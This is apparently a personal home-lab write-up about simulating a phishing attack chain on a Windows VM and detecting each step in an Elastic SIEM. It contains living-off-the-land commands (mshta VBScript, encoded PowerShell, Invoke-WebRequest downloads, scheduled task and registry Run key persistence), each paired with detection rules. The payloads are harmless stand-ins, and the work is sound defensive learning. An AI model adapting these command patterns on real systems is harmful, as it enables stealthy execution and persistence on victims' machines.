# SOC Home Lab — Phishing to Persistence Attack Simulation

I built a home lab using a Windows 11 VM, Sysmon, Winlogbeat, and ELK Stack (Elastic SIEM) to simulate a real-world phishing attack chain from start to finish — and then detect every single step using custom detection rules I wrote myself.

This isn't a CTF writeup. It's me actually understanding what attackers do, why they do it, and how to catch them.

---

## The Attack Chain

```
Phishing Email → MSHTA → PowerShell → Encoded Command → Download Payload → Scheduled Task → Registry Run Key
```

Every step below actually fired in my SIEM. Screenshots included as proof.

---

## Step 1 — MSHTA Execution

**What the attacker is doing:**
The victim opens a phishing attachment. Hidden inside is a call to `mshta.exe` — a real Windows tool that runs HTML/script files. Attackers love this because antivirus almost never flags it (it's a legit Microsoft binary). This is called "Living off the Land" — using Windows against itself.

**Command I ran to simulate it:**
```cmd
mshta.exe vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run ""calc.exe"",0,true"))
```

**What I saw in ELK:**
Sysmon Event ID 1 fired — `mshta.exe` spawned as a child of `cmd.exe`. That parent-child relationship is the red flag. Real `mshta.exe` launched by a user comes from `explorer.exe`. Seeing `cmd.exe` as the parent means something scripted this — not a human double-clicking a file.

**My detection rule:**
```
event.code: "1" AND process.name: "mshta.exe" AND process.command_line: *vbscript*
```
Alert triggered → **High severity, Risk Score 73**



---

## Step 2 & 3 — PowerShell + Encoded Command

**What the attacker is doing:**
MSHTA launches PowerShell. But they don't run a plain command — they Base64-encode it first. Why? Because most basic detection rules look for keywords like `Invoke-Mimikatz` or `DownloadFile`. Encode those words and they become random garbage — the keyword disappears from the raw log.

**Commands I ran:**
```powershell
# Generate the encoded string
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('Start-Process calc.exe'))

# Execute it
powershell.exe -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAYQBsAGMALgBlAHgAZQA=
```

**What I saw in ELK:**
Two things happened. First, Sysmon Event ID 1 logged `powershell.exe` with `-EncodedCommand` in the command line. Second — and this is the interesting part — PowerShell Script Block Logging (Event 4104) automatically decoded the Base64 and logged the plain text command alongside it. So the attacker tried to hide their command, and Windows literally wrote the decoded version to the log anyway.

I also noticed the parent process of `powershell.exe` was `powershell.exe` itself — another strong indicator since legitimate processes rarely chain PowerShell like that.

**My detection rules:**
```
event.code: "1" AND process.command_line: (*-EncodedCommand* OR *-enc *)
```
Alert triggered → **High severity, Risk Score 73**

![Encoded PowerShell Alert](screenshots/encoded_ps_alert.png)
![Encoded PowerShell in Discover](screenshots/encoded_ps_discover.png)

---

## Step 4 — PowerShell Download Activity

**What the attacker is doing:**
PowerShell is running. Now the attacker uses it to reach out to their server and pull down the real malware — a RAT, a beacon, Mimikatz, whatever they need. They use `Invoke-WebRequest` because it's built into Windows and the traffic goes over HTTPS port 443, which most firewalls allow without question.

**Command I ran:**
```powershell
powershell.exe -Command "Invoke-WebRequest -Uri 'https://example.com' -OutFile '$env:TEMP\test_payload.txt'"
```

**What I saw in ELK:**
Searched for `process.command_line: *Invoke-WebRequest*` in Discover and found 11 documents — `powershell.exe` on `win11-vm`, user `NITS`, making an outbound web request and writing a file to the Temp directory. Sysmon logged both the network connection (Event ID 3) and the file being created (Event ID 11).

The Temp directory is a huge indicator. Legitimate software doesn't download things to `AppData\Local\Temp` and execute them. Attackers do it because that path is writable without admin rights.

**My detection rule:**
```
event.code: "1" AND process.name: "powershell.exe" AND process.command_line: (*Invoke-WebRequest* OR *WebClient* OR *DownloadFile*)
```
Alert triggered → **High severity, 11 alerts**



---

## Step 5 — Scheduled Task Creation (Persistence)

**What the attacker is doing:**
They're in. But if the machine reboots, they lose their session. So they create a Scheduled Task to automatically restart their payload. They name it something that sounds legitimate — `SecurityUpdateTask`, `WindowsDefenderUpdate` — so it hides among hundreds of real scheduled tasks that already exist on every Windows machine.

**Command I ran:**
```cmd
schtasks /create /tn "SecurityUpdateTask" /tr "notepad.exe" /sc daily /st 12:00
```

**What I saw in ELK:**
`schtasks.exe` showed up in Discover with the full command line visible: `schtasks /create /tn "SecurityUpdateTask" /tr "notepad.exe" /sc daily /st 12:00`. The parent process was `cmd.exe`. Windows Security Event 4698 also fired, which logs scheduled task creation with full task details including what binary it runs and who created it.

I also saw `taskhostw.exe` fire shortly after — that's Windows Task Scheduler actually executing the task. So I could see both the creation and the execution in the logs.

**My detection rule:**
```
event.code: "4698"
AND process.parent.name: ("powershell.exe" OR "cmd.exe" OR "mshta.exe")
```
Alert triggered → **High severity, Risk Score 73** — user `NITS` on `win11-vm`

![Scheduled Task Alert](screenshots/schtask_alert.png)
![Scheduled Task in Discover](screenshots/schtask_discover.png)

---

## Step 6 — Registry Run Key (Backup Persistence)

**What the attacker is doing:**
Smart attackers don't rely on just one persistence method. If someone finds and deletes the scheduled task, they want a backup. Registry Run keys are one of the oldest tricks — anything listed under `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` automatically executes every time the user logs in. It hides among dozens of legitimate entries (browser updaters, cloud sync apps, etc.).

**Command I ran:**
```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "LabPersistenceTest" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
```

**What I saw in ELK:**
Searched for `process.name: "reg.exe" OR registry.value.name: "LabPersistenceTest"` — found 3 documents. The command line was fully visible: `reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "LabPersistenceTest" /d "C:\Windows\System32\calc.exe"`. Sysmon Event ID 13 (Registry Value Set) captured the exact registry path being modified.

The final SIEM summary showed 3 high alerts: 2x `Registry Run Key Creation` + 1x `Scheduled Task Creation` — both persistence mechanisms caught.

**My detection rule:**
```
event.code: "13" AND registry.path: (*\\CurrentVersion\\Run*)
```
Alert triggered → **High severity, Risk Score 73**, 2 alerts



---

## What This Proves

Every step in this chain used **legitimate Windows tools** — no malware.exe, nothing exotic. That's exactly how real attackers operate. The detection is never about finding "the bad file" — it's about understanding what normal looks like and spotting when trusted tools are being abused in abnormal ways.

The full alert chain I generated across all 6 steps:

| Alert | Severity | What It Caught |
|-------|----------|----------------|
| MSHTA Execution | High | mshta.exe with inline VBScript, suspicious parent |
| Encoded PowerShell Command | High | -EncodedCommand flag, powershell spawned by powershell |
| PowerShell Download Activity | High | Invoke-WebRequest, file written to Temp |
| Scheduled Task Creation | High | schtasks /create via cmd.exe, user NITS |
| Registry Run Key Creation | High | reg.exe writing to CurrentVersion\Run |

All detections were custom rules I built. All evidence is from my real lab running on June 23, 2026.

---

## Lab Setup

- Windows 11 VM (VirtualBox)
- Sysmon with SwiftOnSecurity config
- Winlogbeat → Elasticsearch
- Kibana (ELK Stack) for SIEM and detection rules
- All simulations used safe, harmless commands — no real malware
